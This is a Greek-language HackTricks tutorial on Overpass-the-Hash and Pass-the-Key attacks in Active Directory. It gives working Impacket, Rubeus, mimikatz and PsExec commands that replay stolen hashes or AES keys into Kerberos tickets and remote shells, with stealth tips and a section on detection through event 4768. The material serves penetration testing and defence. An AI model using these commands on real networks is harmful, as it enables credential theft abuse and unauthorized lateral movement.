# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Η επίθεση **Overpass The Hash/Pass The Key (PTK)** έχει σχεδιαστεί για περιβάλλοντα όπου το παραδοσιακό πρωτόκολλο NTLM είναι περιορισμένο και η authentication μέσω Kerberos έχει προτεραιότητα. Αυτή η επίθεση αξιοποιεί το NTLM hash ή τα AES keys ενός χρήστη για την απόκτηση Kerberos tickets, επιτρέποντας μη εξουσιοδοτημένη πρόσβαση σε πόρους μέσα σε ένα δίκτυο.

Αυστηρά μιλώντας:

- Το **Over-Pass-the-Hash** συνήθως σημαίνει τη μετατροπή του **NT hash** σε Kerberos TGT μέσω του **RC4-HMAC** Kerberos key.
- Το **Pass-the-Key** είναι η πιο γενική εκδοχή, όπου διαθέτετε ήδη ένα Kerberos key, όπως **AES128/AES256**, και ζητάτε απευθείας ένα TGT χρησιμοποιώντας το.

Αυτή η διαφορά έχει σημασία σε hardened περιβάλλοντα: αν το **RC4 είναι απενεργοποιημένο** ή δεν θεωρείται πλέον προεπιλογή από το KDC, το **NT hash από μόνο του δεν επαρκεί** και χρειάζεστε ένα **AES key** ή τον κωδικό πρόσβασης σε cleartext, ώστε να το παράγετε.

Για την εκτέλεση αυτής της επίθεσης, το αρχικό βήμα περιλαμβάνει την απόκτηση του NTLM hash ή του κωδικού πρόσβασης του λογαριασμού του στοχευμένου χρήστη. Αφού εξασφαλιστούν αυτές οι πληροφορίες, μπορεί να αποκτηθεί ένα Ticket Granting Ticket (TGT) για τον λογαριασμό, επιτρέποντας στον attacker να αποκτήσει πρόσβαση σε services ή machines στα οποία ο χρήστης έχει permissions.

Η διαδικασία μπορεί να ξεκινήσει με τις ακόλουθες εντολές:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Για σενάρια που απαιτούν AES256, μπορεί να χρησιμοποιηθεί η επιλογή `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
Το `getTGT.py` υποστηρίζει επίσης την απευθείας αίτηση ενός **service ticket μέσω ενός AS-REQ** με το `-service <SPN>`, κάτι που μπορεί να είναι χρήσιμο όταν θέλετε ένα ticket για ένα συγκεκριμένο SPN χωρίς ένα επιπλέον TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Επιπλέον, το ticket που αποκτήθηκε μπορεί να χρησιμοποιηθεί με διάφορα tools, συμπεριλαμβανομένων των `smbexec.py` ή `wmiexec.py`, διευρύνοντας το εύρος της επίθεσης.

Προβλήματα όπως _PyAsn1Error_ ή _KDC cannot find the name_ συνήθως επιλύονται με την ενημέρωση της βιβλιοθήκης Impacket ή με τη χρήση του hostname αντί της διεύθυνσης IP, διασφαλίζοντας τη συμβατότητα με το Kerberos KDC.

Μια εναλλακτική ακολουθία εντολών με χρήση του Rubeus.exe παρουσιάζει μια ακόμη πτυχή αυτής της τεχνικής:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Αυτή η μέθοδος αντικατοπτρίζει την προσέγγιση **Pass the Key**, με έμφαση στην κατάληψη και την άμεση αξιοποίηση του ticket για σκοπούς authentication. Στην πράξη:

- Το `Rubeus asktgt` στέλνει το **raw Kerberos AS-REQ/AS-REP** και δεν χρειάζεται δικαιώματα διαχειριστή, εκτός αν θέλετε να στοχεύσετε άλλη logon session με `/luid` ή να δημιουργήσετε ξεχωριστή με `/createnetonly`.
- Το `mimikatz sekurlsa::pth` κάνει patch το credential material σε μια logon session και επομένως αγγίζει το `LSASS`, κάτι που συνήθως απαιτεί local admin ή `SYSTEM` και είναι πιο θορυβώδες από την οπτική ενός EDR.

Παραδείγματα με Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Για συμμόρφωση με την επιχειρησιακή ασφάλεια και χρήση AES256, μπορεί να εφαρμοστεί η ακόλουθη εντολή:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
Το `/opsec` είναι σχετικό επειδή η κίνηση που δημιουργείται από το Rubeus διαφέρει ελαφρώς από το native Windows Kerberos. Σημειώστε επίσης ότι το `/opsec` προορίζεται για κίνηση **AES256**· η χρήση του με RC4 συνήθως απαιτεί `/force`, γεγονός που αναιρεί μεγάλο μέρος του σκοπού του, επειδή το **RC4 σε σύγχρονα domains αποτελεί από μόνο του ισχυρό σήμα**.

## Σημειώσεις ανίχνευσης

Κάθε αίτημα TGT δημιουργεί το **event `4768`** στον DC. Στις τρέχουσες εκδόσεις των Windows, αυτό το event περιέχει περισσότερα χρήσιμα πεδία από όσα αναφέρουν παλαιότερα writeups:

- Το `TicketEncryptionType` υποδεικνύει ποιο enctype χρησιμοποιήθηκε για το TGT που εκδόθηκε. Τυπικές τιμές είναι `0x17` για **RC4-HMAC**, `0x11` για **AES128** και `0x12` για **AES256**.<sup>[[3]](#references)</sup>
- Τα ενημερωμένα events εκθέτουν επίσης τα `SessionKeyEncryptionType`, `PreAuthEncryptionType` και τα enctypes που διαφημίζει ο client, κάτι που βοηθά στη διάκριση της **πραγματικής εξάρτησης από RC4** από συγκεχυμένα legacy defaults.
- Η εμφάνιση του `0x17` σε ένα σύγχρονο περιβάλλον αποτελεί καλή ένδειξη ότι ο λογαριασμός, ο host ή το KDC fallback path εξακολουθεί να επιτρέπει RC4 και επομένως είναι πιο φιλικό σε NT-hash-based Over-Pass-the-Hash.

Η Microsoft μειώνει σταδιακά τη συμπεριφορά RC4-by-default από τις ενημερώσεις hardening του Kerberos τον Νοέμβριο του 2022, και η τρέχουσα δημοσιευμένη guidance είναι να **αφαιρεθεί το RC4 ως το default assumed enctype για AD DCs έως το τέλος του Q2 2026**. Από offensive perspective, αυτό σημαίνει ότι το **Pass-the-Key με AES** είναι ολοένα και περισσότερο η αξιόπιστη διαδρομή, ενώ το κλασικό **NT-hash-only OpTH** θα συνεχίσει να αποτυγχάνει συχνότερα σε hardened estates.<sup>[[3]](#references)</sup>

Για περισσότερες λεπτομέρειες σχετικά με τα Kerberos encryption types και τη σχετική συμπεριφορά του ticketing, δείτε:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Πιο stealthy έκδοση

> [!WARNING]
> Κάθε logon session μπορεί να έχει μόνο ένα ενεργό TGT τη φορά, επομένως χρειάζεται προσοχή.

1. Δημιουργήστε ένα νέο logon session με το **`make_token`** από το Cobalt Strike.
2. Στη συνέχεια, χρησιμοποιήστε το Rubeus για να δημιουργήσετε ένα TGT για το νέο logon session χωρίς να επηρεάσετε το υπάρχον.

Μπορείτε να επιτύχετε παρόμοια απομόνωση απευθείας από το Rubeus με ένα sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Αυτό αποφεύγει την αντικατάσταση του τρέχοντος TGT της session και είναι συνήθως ασφαλέστερο από την εισαγωγή του ticket στην υπάρχουσα logon session.

## Αναφορές

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
